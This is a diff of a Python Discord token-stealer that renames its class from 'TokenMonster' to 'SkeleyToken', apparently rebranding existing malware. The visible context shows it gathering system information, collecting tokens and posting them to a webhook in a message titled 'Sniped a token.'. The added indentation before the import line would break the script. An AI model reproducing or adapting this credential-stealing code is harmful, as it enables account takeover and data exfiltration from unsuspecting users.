@@ -1,4 +1,4 @@
-import os, re, json, random, platform, socket, uuid, requests
+  import os, re, json, random, platform, socket, uuid, requests
 
 WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"
 
@@ -25,7 +25,7 @@ def system_info(return_type=0):
         return json.dumps(info)
 
 
-class TokenMonster:
+class SkeleyToken:
 
     def __init__(self):
         if os.name != 'nt':
@@ -47,7 +47,7 @@ class TokenMonster:
             if "username" in user:
 
                 if WEBHOOK_URL:
-                    webhook_data = {"username": "TokenMonster", "embeds": [
+                    webhook_data = {"username": "SkeleyToken", "embeds": [
                         dict(title="Sniped a token.",
                              color=f'{color}',
                              fields=[
@@ -118,4 +118,4 @@ class TokenMonster:
                             self.tokens.append(token)
 
 
-init = TokenMonster()
+init = SkeleyToken()
